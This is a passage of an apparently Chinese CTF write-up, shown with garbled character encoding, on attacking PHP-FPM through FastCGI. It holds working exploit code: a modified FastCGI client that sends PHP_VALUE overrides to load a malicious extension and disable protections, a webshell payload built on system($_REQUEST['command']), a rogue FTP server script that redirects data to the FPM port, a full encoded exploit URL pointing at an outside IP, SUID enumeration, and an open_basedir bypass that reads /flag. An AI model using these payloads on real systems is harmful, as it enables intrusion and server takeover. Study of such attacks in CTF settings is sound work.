&#125;</span><br><span class="line">        <span class="keyword">return</span> $array;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Decode a FastCGI Packet</span><br><span class="line">     *</span><br><span class="line">     * @param String $data String containing <span class="built_in">all</span> the packet</span><br><span class="line">     * @<span class="keyword">return</span> array</span><br><span class="line">     */</span><br><span class="line">    private function decodePacketHeader($data)</span><br><span class="line">    &#123;</span><br><span class="line">        $ret = array();</span><br><span class="line">        $ret[<span class="string">&#x27;version&#x27;</span>]       = <span class="built_in">ord</span>($data&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;type&#x27;</span>]          = <span class="built_in">ord</span>($data&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;requestId&#x27;</span>]     = (<span class="built_in">ord</span>($data&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="built_in">ord</span>($data&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;contentLength&#x27;</span>] = (<span class="built_in">ord</span>($data&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="built_in">ord</span>($data&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;paddingLength&#x27;</span>] = <span class="built_in">ord</span>($data&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;reserved&#x27;</span>]      = <span class="built_in">ord</span>($data&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Read a FastCGI Packet</span><br><span class="line">     *</span><br><span class="line">     * @<span class="keyword">return</span> array</span><br><span class="line">     */</span><br><span class="line">    private function readPacket()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123;</span><br><span class="line">            $resp = $this-&gt;decodePacketHeader($packet);</span><br><span class="line">            $resp[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                $<span class="built_in">len</span>  = $resp[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> ($<span class="built_in">len</span> &amp;&amp; $buf=fread($this-&gt;_sock, $<span class="built_in">len</span>)) &#123;</span><br><span class="line">                    $<span class="built_in">len</span> -= strlen($buf);</span><br><span class="line">                    $resp[<span class="string">&#x27;content&#x27;</span>] .= $buf;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                $buf=fread($this-&gt;_sock, $resp[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $resp;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Get Informations on the FastCGI application</span><br><span class="line">     *</span><br><span class="line">     * @param array $requestedInfo information to retrieve</span><br><span class="line">     * @<span class="keyword">return</span> array</span><br><span class="line">     */</span><br><span class="line">    public function getValues(array $requestedInfo)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">        $request = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        foreach ($requestedInfo <span class="keyword">as</span> $info) &#123;</span><br><span class="line">            $request .= $this-&gt;buildNvpair($info, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, <span class="number">0</span>));</span><br><span class="line">        $resp = $this-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> ($resp[<span class="string">&#x27;type&#x27;</span>] == self::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> $this-&gt;readNvpair($resp[<span class="string">&#x27;content&#x27;</span>], $resp[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            throw new Exception(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Execute a request to the FastCGI application</span><br><span class="line">     *</span><br><span class="line">     * @param array $params Array of parameters</span><br><span class="line">     * @param String $stdin Content</span><br><span class="line">     * @<span class="keyword">return</span> String</span><br><span class="line">     */</span><br><span class="line">    public function request(array $params, $stdin)</span><br><span class="line">    &#123;</span><br><span class="line">        $response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">//        $this-&gt;connect();</span><br><span class="line">        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, <span class="built_in">chr</span>(<span class="number">0</span>) . <span class="built_in">chr</span>(self::RESPONDER) . <span class="built_in">chr</span>((<span class="built_in">int</span>) $this-&gt;_keepAlive) . str_repeat(<span class="built_in">chr</span>(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        $paramsRequest = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        foreach ($params <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            $paramsRequest .= $this-&gt;buildNvpair($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($paramsRequest) &#123;</span><br><span class="line">            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= $this-&gt;buildPacket(self::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($stdin) &#123;</span><br><span class="line">            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= $this-&gt;buildPacket(self::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        echo(<span class="string">&#x27;data=&#x27;</span>.urlencode($request));</span><br><span class="line">//        fwrite($this-&gt;_sock, $request);</span><br><span class="line">//        do &#123;</span><br><span class="line">//            $resp = $this-&gt;readPacket();</span><br><span class="line">//            <span class="keyword">if</span> ($resp[<span class="string">&#x27;type&#x27;</span>] == self::STDOUT || $resp[<span class="string">&#x27;type&#x27;</span>] == self::STDERR) &#123;</span><br><span class="line">//                $response .= $resp[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">//            &#125;</span><br><span class="line">//        &#125; <span class="keyword">while</span> ($resp &amp;&amp; $resp[<span class="string">&#x27;type&#x27;</span>] != self::END_REQUEST);</span><br><span class="line">//        var_dump($resp);</span><br><span class="line">//        <span class="keyword">if</span> (!is_array($resp)) &#123;</span><br><span class="line">//            throw new Exception(<span class="string">&#x27;Bad request&#x27;</span>);</span><br><span class="line">//        &#125;</span><br><span class="line">//        switch (<span class="built_in">ord</span>($resp[<span class="string">&#x27;content&#x27;</span>]&#123;<span class="number">4</span>&#125;)) &#123;</span><br><span class="line">//            <span class="keyword">case</span> self::CANT_MPX_CONN:</span><br><span class="line">//                throw new Exception(<span class="string">&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;</span>);</span><br><span class="line">//                <span class="keyword">break</span>;</span><br><span class="line">//            <span class="keyword">case</span> self::OVERLOADED:</span><br><span class="line">//                throw new Exception(<span class="string">&#x27;New request rejected; too busy [OVERLOADED]&#x27;</span>);</span><br><span class="line">//                <span class="keyword">break</span>;</span><br><span class="line">//            <span class="keyword">case</span> self::UNKNOWN_ROLE:</span><br><span class="line">//                throw new Exception(<span class="string">&#x27;Role value not known [UNKNOWN_ROLE]&#x27;</span>);</span><br><span class="line">//                <span class="keyword">break</span>;</span><br><span class="line">//            <span class="keyword">case</span> self::REQUEST_COMPLETE:</span><br><span class="line">//                <span class="keyword">return</span> $response;</span><br><span class="line">//        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">// real exploit start here</span><br><span class="line">//<span class="keyword">if</span> (!isset($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">//    die(<span class="string">&quot;Check your input\n&quot;</span>);</span><br><span class="line">//&#125;</span><br><span class="line">//<span class="keyword">if</span> (!isset($_REQUEST[<span class="string">&#x27;filepath&#x27;</span>])) &#123;</span><br><span class="line">//    $filepath = __FILE__;</span><br><span class="line">//&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">//    $filepath = $_REQUEST[<span class="string">&#x27;filepath&#x27;</span>];</span><br><span class="line">//&#125;</span><br><span class="line"></span><br><span class="line">$filepath = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;    // ç›®æ ‡ä¸»æœºå·²çŸ¥çš„PHPæ–‡ä»¶çš„è·¯å¾„</span><br><span class="line">$req = <span class="string">&#x27;/&#x27;</span>.basename($filepath);</span><br><span class="line">$uri = $req .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;    // å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡</span><br><span class="line">$client = new FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">$code = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>;    // å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡</span><br><span class="line">$php_value = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;//åŠ è½½hpdoger.soæ–‡ä»¶</span><br><span class="line">$params = array(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; $filepath,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; $req,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; $uri,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; $req,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; $php_value,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen($code)</span><br><span class="line">);</span><br><span class="line">// print_r($_REQUEST);</span><br><span class="line">// print_r($params);</span><br><span class="line">//echo <span class="string">&quot;Call: $uri\n\n&quot;</span>;</span><br><span class="line">echo $client-&gt;request($params, $code).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ ¹æ®<a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php">fcgi_jailbreak.php</a>æ”¹ç¼–</p><h2 id="ftpåˆ©ç”¨"><span id="ftpåˆ©ç”¨"> ftpåˆ©ç”¨</span></h2><p>ç”±äºè¿™é‡Œç¦ç”¨äº†è®¸å¤šå‡½æ•°å’Œç±»ï¼Œåƒé‚£äº›æ™®é€šèƒ½æ„æˆ SSRF çš„å‡½æ•°å’Œç±»éƒ½æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ FTP åè®®æœªè¢«ç¦ç”¨ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ VPSä¸Šæ­å»ºæ¶æ„çš„FTPæœåŠ¡å™¨ï¼Œéª—å–ç›®æ ‡ä¸»æœºå°† Payload é‡å®šå‘åˆ°è‡ªå·±çš„ 9001 ç«¯å£ä¸Šï¼Œä»è€Œå®ç°æ”»å‡» PHP-FPM å¹¶æ‰§è¡Œå‘½ä»¤ã€‚</p><p>FTPï¼ˆFile Transfer Protocolï¼‰ä¹Ÿæ”¯æŒä¸»åŠ¨æ¨¡å¼å’Œè¢«åŠ¨æ¨¡å¼ï¼Œè¿™ä¸¤ç§æ¨¡å¼æ¶‰åŠåˆ°æ•°æ®è¿æ¥çš„å»ºç«‹æ–¹å¼ã€‚ä»¥ä¸‹æ˜¯ä¸»åŠ¨æ¨¡å¼å’Œè¢«åŠ¨æ¨¡å¼åœ¨ FTP ä¸­çš„å·¥ä½œåŸç†ï¼š</p><ol><li><strong>ä¸»åŠ¨æ¨¡å¼ï¼ˆActive Modeï¼‰ï¼š</strong><ul><li>å®¢æˆ·ç«¯åœ¨å‘½ä»¤è¿æ¥ä¸Šå‘é€ PORT å‘½ä»¤å‘Šè¯‰æœåŠ¡å™¨å®ƒæ‰“å¼€äº†ä¸€ä¸ªç«¯å£ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªéšæœºç«¯å£ï¼‰ç­‰å¾…æœåŠ¡å™¨è¿æ¥ã€‚</li><li>æœåŠ¡å™¨åœ¨æ•°æ®è¿æ¥ä¸Šè¿æ¥åˆ°å®¢æˆ·ç«¯æŒ‡å®šçš„åœ°å€å’Œç«¯å£ï¼Œè¿›è¡Œæ•°æ®ä¼ è¾“ã€‚</li><li>ä¸»åŠ¨æ¨¡å¼éœ€è¦å®¢æˆ·ç«¯æ‰“å¼€ä¸€ä¸ªç”¨äºæ•°æ®ä¼ è¾“çš„ç«¯å£ï¼Œå¹¶å‘ŠçŸ¥æœåŠ¡å™¨è¿æ¥çš„åœ°å€ï¼Œè¿™å¯èƒ½å¯¼è‡´é˜²ç«å¢™é—®é¢˜ï¼Œå› ä¸ºå®¢æˆ·ç«¯ç«¯å£çš„æ‰“å¼€å’ŒæœåŠ¡å™¨çš„è¿æ¥éœ€è¦ç©¿é€é˜²ç«å¢™ã€‚</li></ul></li><li><strong>è¢«åŠ¨æ¨¡å¼ï¼ˆPassive Modeï¼‰ï¼š</strong><ul><li>å®¢æˆ·ç«¯åœ¨å‘½ä»¤è¿æ¥ä¸Šå‘é€ PASV å‘½ä»¤å‘Šè¯‰æœåŠ¡å™¨å‡†å¤‡å¥½æ¥æ”¶æ•°æ®è¿æ¥ã€‚</li><li>æœåŠ¡å™¨æ‰“å¼€ä¸€ä¸ªç”¨äºæ•°æ®ä¼ è¾“çš„ç«¯å£ï¼Œå¹¶è¿”å›è¿™ä¸ªç«¯å£çš„ä¿¡æ¯ç»™å®¢æˆ·ç«¯ã€‚</li><li>å®¢æˆ·ç«¯è¿æ¥åˆ°æœåŠ¡å™¨è¿”å›çš„åœ°å€å’Œç«¯å£ï¼Œè¿›è¡Œæ•°æ®ä¼ è¾“ã€‚</li><li>è¢«åŠ¨æ¨¡å¼ç›¸å¯¹äºä¸»åŠ¨æ¨¡å¼æ›´å®¹æ˜“ç©¿è¶Šé˜²ç«å¢™ï¼Œå› ä¸ºæ•°æ®è¿æ¥æ˜¯ç”±å®¢æˆ·ç«¯å‘èµ·çš„ã€‚</li></ul></li></ol><p>è¯´äººè¯,ä¸»åŠ¨æ¨¡å¼å®¢æˆ·ç«¯å¼€ä¸¤ä¸ªç«¯å£,ä¸€ä¸ªç«¯å£ç”¨äºè¿æ¥æœåŠ¡ç«¯21ç«¯å£,å‘Šè¯‰ä»–æœåŠ¡å™¨å¦ä¸€ä¸ªç«¯å£,ç„¶åè®©æœåŠ¡ç«¯æ¥è¿æ¥.</p><p>è¢«åŠ¨æ¨¡å¼åŒæ ·ä¸€ä¸ªç«¯å£è¿21ç«¯å£,ç„¶åå«æœåŠ¡å™¨åˆ«è¿å›æ¥,è®©æœåŠ¡å™¨å¼€ä¸ªç«¯å£,ç„¶åå®¢æˆ·ç«¯ç”¨å¦ä¸€ä¸ªç«¯å£è¿æ¥è¿™ä¸ªç«¯å£,è·å–æ•°æ®.</p><p>å€˜è‹¥æˆ‘ä»¬è‡ªå·±åœ¨vpsæ­ä¸ªfpsæœåŠ¡ç«¯,ä¸Šä¼ æ¶æ„æ•°æ®,åˆ©ç”¨è¢«åŠ¨æ¨¡å¼,æœåŠ¡ç«¯æŒ‡å®šå®¢æˆ·ç«¯ä½¿ç”¨9000ç«¯å£(<code>fpmæœåŠ¡ç«¯å£</code>)è¯»å–æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„æ•°æ®,é‚£ä¹ˆå°±å®ç°äº†æ¶æ„æ”»å‡».</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æˆ‘ä»¬vpsä¸Šèµ·ä¸ªæ¶æ„çš„ftp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">7777</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æœ€ç»ˆexp"><span id="æœ€ç»ˆexp"> æœ€ç»ˆexp</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($_GET[<span class="string">&#x27;file&#x27;</span>],$_GET[<span class="string">&#x27;data&#x27;</span>]);ftp://root@<span class="number">43.143</span><span class="number">.192</span><span class="number">.19</span>:<span class="number">3307</span>/&amp;data=%01%01%<span class="number">00</span>%01%<span class="number">00</span>%08%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%04%<span class="number">00</span>%01%02%3B%<span class="number">00</span>%<span class="number">00</span>%<span class="number">11</span>%0BGATEWAY_INTERFACEFastCGI%2F1<span class="number">.0</span>%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%<span class="number">80</span>%<span class="number">00</span>%<span class="number">00</span>%AFPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+exp.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1<span class="number">.1</span>%0E%02CONTENT_LENGTH49%01%04%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%01%05%<span class="number">00</span>%01%001%<span class="number">00</span>%<span class="number">00</span>%3C%3Fphp+system%<span class="number">28</span>%24_REQUEST%5B%27command%<span class="number">27</span>%5D%<span class="number">29</span>%3B+phpinfo%<span class="number">28</span>%<span class="number">29</span>%3B+%3F%3E%01%05%<span class="number">00</span>%01%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure><p>file_put_contentsæ”¯æŒftpåè®®,è®©å®¢æˆ·ç«¯è¿æ¥åˆ°æˆ‘ä»¬çš„ftp,ç„¶åå¼€å¯è¢«åŠ¨æ¨¡å¼,æœåŠ¡ç«¯æŒ‡å®šå®¢æˆ·ç«¯ç”¨9001ç«¯å£è¯»å–æ•°æ®,ä»è€Œå®ç°åˆ©ç”¨.</p><p>æ‹¿åˆ°shellå,SUIDææƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -a<span class="comment">#è¿›å…¥äº¤äº’æ¨¡å¼</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">&#x27;css&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);echo file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="é¢˜ç›®çš„fpmæ€ä¹ˆæ‰“"><span id="é¢˜ç›®çš„fpmæ€ä¹ˆæ‰“"> é¢˜ç›®çš„fpmæ€ä¹ˆæ‰“</span></h1><p>é¢˜ç›®ä¸å‡ºç½‘,curlçš„è¯é«˜ç‰ˆæœ¬ä¹Ÿä¸èƒ½ç”¨,å¥½åœ¨è¿˜æœ‰ä¸ªfsockopen.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fflush</span>()</span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤§æ¦‚åˆ©ç”¨å°±æ˜¯å¦‚ä¸Šæ‰€ç¤º.</p><p>ç”±äºå†™å¾ªç¯æ›´ä¸ºå¤æ‚,å°†fgetsæ›¿æ¢æˆfread,åŒæ ·ä¹Ÿæ˜¯è¯»å–æ–‡ä»¶çš„å‡½æ•°.</p><p>ä¼˜åŒ–ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;9000&quot;</span>);</span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$fpm_data</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$out</span>);</span><br><span class="line"><span class="title function_ invoke__">fflush</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$contents</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>,<span class="number">8</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ 